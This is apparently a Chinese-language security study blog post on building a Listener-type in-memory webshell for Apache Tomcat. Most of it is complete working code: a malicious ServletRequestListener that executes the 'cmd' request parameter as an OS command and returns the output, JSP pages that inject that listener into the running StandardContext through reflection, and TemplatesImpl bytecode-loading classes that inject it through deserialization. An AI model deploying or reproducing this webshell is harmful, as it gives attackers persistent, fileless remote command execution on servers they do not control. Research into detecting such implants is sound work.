---
title: Tomcat内存马—Listener型
date: 2023-06-14 22:10:33
excerpt: Tomcat内存马—Listener型
categories: 学习
---



## 前言

之前学了 filter 型的内存马，现在继续学习 listener 型

## 正文

前面的 `filter` 内存马是通过动态注册恶意的 `filter` 来实现一个 `webshell` ，这个 `listener` 内存马原理其实也差不多，就是动态注册一个恶意的 `listener` 。

### 构造恶意Listener

这个恶意的 `Listener` 要实现一个webshell的功能，就需要获取到 `request` 对象，现在来看一下怎么构造出这个恶意 `Listener`



`requestInitialized` 方法只有一个`ServletRequestEvent` 类型的参数，也就是servlet请求事件。那么就需要想办法从这个 `ServletRequestEvent` 对象中来获取 `request` 对象。



可以看到该对象有一个 `getServletRequest` 方法，看起来就跟 `request` 对象有关





可以看到返回了一个 `ServletRequest` 接口的实现类的对象，测试一下看看具体返回的哪个类的对象



可以看到是 `org.apache.catalina.connector.RequestFacade` 的对象，看看他有哪些属性



发现其有 `request` 属性是 `Request` 类型的，那么我们就可以通过反射来获取该属性的值

开始构造恶意 `Listener`

```auto
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;

import javax.servlet.Filter;
import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;

public class Testlistener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();
        try {
            Field requestf=test.getClass().getDeclaredField("request");
            requestf.setAccessible(true);
            Request request= (Request) requestf.get(test);
            Response response=request.getResponse();

            String cmd=request.getParameter("cmd");
            if(cmd!=null){
                InputStream in = Runtime.getRuntime().exec("cmd /c"+cmd).getInputStream();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int a = -1;

                while ((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }

                response.getWriter().write(new String(baos.toByteArray()));
            }
        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {
            e.printStackTrace();
        }

    }
}
```



成功

### 实现动态注册Listener

现在来理一下 `Listener` 的注册流程



先下两个断点，第一个断点是为了查看什么时候进行的实例化，第二个断点是要知道什么时候调用的该方法。



在 `StandardContext$listenerStart`进行实例化，我们跟踪一下 `listeners` 的来源



`listeners` 是一个 `String` 类型的数组，存储了 `listener` 的名字,通过 `findApplicationListeners` 方法获取值



`results` 数组用来存储已经实例化的 `listener` 对象，然后继续看



将 `results` 中的 `listener` 分类存放，我们的 `TestListener` 就被分到了 `eventListeners` 中



然后调用 `getApplicationEventListeners` 获取 `applicationEventListenersList` ，就是已注册的 `applicationEventListener` ，并将其添加到我们的 `eventListeners` 中。之后再调用 `setApplicationEventListeners` 将`eventListeners` 设置为`ApplicationEventListeners` 。刚看到时我在想，为什么要将已有的`applicationEventListener` 取出来，然后再 `set` 呢，这不会重复吗，随后跟进一下 `setApplicationEventListeners` 方法的源码就知道了

```auto
public void setApplicationEventListeners(Object[] listeners) {
        this.applicationEventListenersList.clear();
        if (listeners != null && listeners.length > 0) {
            this.applicationEventListenersList.addAll(Arrays.asList(listeners));
        }

    }
```

该方法首先会清空 `applicationEventListenersList` ，然后再进行添加。



然后 `instance` 这个数组就会获取所有已注册的 `lsitener` ，且是已实例化的 `listener` ，然后就是一些其他的处理了，这里不再关注。

继续看第二个断点



可以看到对 `requestInitialized` 方法的调用是在 `StandardContext$fireRequestInitEvent` 中进行的，这个 `listener` 是从 `instances` 数组中得到的，而`instances` 又是调用`getApplicationEventListeners` 方法获取的



那么其实我们如果将恶意 `listener` 添加到这个 list中就可以了，就像这样

```auto
Object[] objects = standardContext.getApplicationEventListeners();
List<Object> listeners = Arrays.asList(objects);
List<Object> listenerList = new ArrayList(listeners);
listenerList.add(new Testlistener());
standardContext.setApplicationEventListeners(listenerList.toArray());
```

### JSP实现内存马注入

先使用 `JSP` 实现内存马的注入

```auto
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    class Testlistener implements ServletRequestListener {
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();
            try {
                Field requestf=test.getClass().getDeclaredField("request");
                requestf.setAccessible(true);
                Request request= (Request) requestf.get(test);
                Response response=request.getResponse();

                String cmd=request.getParameter("cmd");
                System.out.println(cmd);
                if(cmd!=null){
                    InputStream in = Runtime.getRuntime().exec("cmd /c"+cmd).getInputStream();
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] b = new byte[1024];
                    int a = -1;

                    while ((a = in.read(b)) != -1) {
                        baos.write(b, 0, a);
                    }

                    response.getWriter().write(new String(baos.toByteArray()));
                }
            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {
                e.printStackTrace();
            }

        }
    }
%>

<%
    //获取StandardContext
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    
    //注入listener
    Object[] objects = standardContext.getApplicationEventListeners();
    List<Object> listeners = Arrays.asList(objects);
    List<Object> listenerList = new ArrayList(listeners);
    listenerList.add(new Testlistener());
    standardContext.setApplicationEventListeners(listenerList.toArray());
%>
```

可以执行命令并获取回显



### 动态加载字节码实现内存马注入

用反序列化有点麻烦，通常我们反序列化注入内存马也是用加载字节码的方式，所以我这里直接加载字节码方便一点，原理一样的。

测试demo

```auto
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Base64;

public class ListenerShell extends HttpServlet{
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String test=req.getParameter("test");
        byte[] bytecode= Base64.getDecoder().decode(test);
        byte[][] bytee= new byte[][]{bytecode};
        TemplatesImpl templates=new TemplatesImpl();
        try {
            setFildValue(templates,"_bytecodes",bytee);
            setFildValue(templates,"_name","Code");
            setFildValue(templates,"_tfactory",new TransformerFactoryImpl());
            templates.newTransformer();
        } catch (TransformerConfigurationException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doGet(req, resp);
    }

    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field=obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj,value);
    }
}
```

就是利用 `TemplatesImpl` 加载字节码，试一下



现在来编写POC，这里我们还是用之前学的 `lastServicedRequest` 的方式获取回显，过程还是分为两不

+   将 `request` 和 `response` 对象分别存放进`lastServicedRequest` 和 `lastServicedResponse` 对象
+   将 `request` 从 `lastServicedRequest`取出，并通过其动态注册恶意 listener

第一步可以直接用之前的代码

```auto
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Field;

public class Echoinject extends AbstractTranslet {
    static {
        try {
            //修改WRAP_SAME_OBJECT的值为true
            Class dispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField("WRAP_SAME_OBJECT");
            WRAP_SAME_OBJECT.setAccessible(true);

            //修改final变量，否则不能修改final的属性
            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            if (!WRAP_SAME_OBJECT.getBoolean(null)) {
                WRAP_SAME_OBJECT.setBoolean(null, true);
            }

            //初始化lastServicedRequest
            Class filterchain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field lastServicedRequest = filterchain.getDeclaredField("lastServicedRequest");
            modifiersField = lastServicedRequest.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            lastServicedRequest.setAccessible(true);
            if (lastServicedRequest.get(null) == null) {
                lastServicedRequest.set(null, new ThreadLocal());
            }

            //初始化初始化lastServicedResponse
            Field lastServicedResponse = filterchain.getDeclaredField("lastServicedResponse");
            modifiersField = lastServicedResponse.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            lastServicedResponse.setAccessible(true);
            if (lastServicedResponse.get(null) == null) {
                lastServicedResponse.set(null, new ThreadLocal());
            }
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

写一下第二步的代码

```auto
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Arrays;
import javax.servlet.ServletContext;
import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.lang.reflect.Field;
import java.util.List;

public class ListenerInject extends AbstractTranslet implements ServletRequestListener {
    static {
        //获取request和response
        try {
            Field context= null;
            context = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            context.setAccessible(true);
            ThreadLocal threadLocal=(ThreadLocal) context.get(null);
            ServletRequest request=null;
            if(threadLocal!=null&&threadLocal.get()!=null){
                request= (ServletRequest) threadLocal.get();
            }

            if(request!=null){
                //获取context
                ServletContext servletContext=request.getServletContext();
                if(servletContext!=null){
                    Field appctx = servletContext.getClass().getDeclaredField("context");
                    appctx.setAccessible(true);
                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

                    Field stdctx = applicationContext.getClass().getDeclaredField("context");
                    stdctx.setAccessible(true);
                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

                    //注入listener
                    Object[] objects = standardContext.getApplicationEventListeners();
                    List<Object> listeners = Arrays.asList(objects);
                    List<Object> listenerList = new ArrayList(listeners);
                    listenerList.add(new ListenerInject());
                    standardContext.setApplicationEventListeners(listenerList.toArray());
                }
            }
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();
        try {
            Field requestf=test.getClass().getDeclaredField("request");
            requestf.setAccessible(true);
            Request request= (Request) requestf.get(test);
            Response response=request.getResponse();

            String cmd=request.getParameter("cmd");
            System.out.println(cmd);
            if(cmd!=null){
                InputStream in = Runtime.getRuntime().exec("cmd /c"+cmd).getInputStream();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int a = -1;

                while ((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }

                response.getWriter().write(new String(baos.toByteArray()));
            }
        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {
            e.printStackTrace();
        }
    }
}
```



成功注入，over

### 另一种动态注入listener的方式

我发现有一个`addApplicationEventListener` 方法，可以直接将对象插进去



```auto
standardContext.addApplicationEventListener(new Testlistener());
```

所以我们的jsp马就可以简化成

```auto
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.List" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    class Testlistener implements ServletRequestListener {
        @Override
        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();
            try {
                Field requestf=test.getClass().getDeclaredField("request");
                requestf.setAccessible(true);
                Request request= (Request) requestf.get(test);
                Response response=request.getResponse();

                String cmd=request.getParameter("cmd");
                System.out.println(cmd);
                if(cmd!=null){
                    InputStream in = Runtime.getRuntime().exec("cmd /c"+cmd).getInputStream();
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] b = new byte[1024];
                    int a = -1;

                    while ((a = in.read(b)) != -1) {
                        baos.write(b, 0, a);
                    }

                    response.getWriter().write(new String(baos.toByteArray()));
                }
            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {
                e.printStackTrace();
            }

        }
    }
%>

<%
    //获取StandardContext
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    //注入listener
    standardContext.addApplicationEventListener(new Testlistener());
%>
```

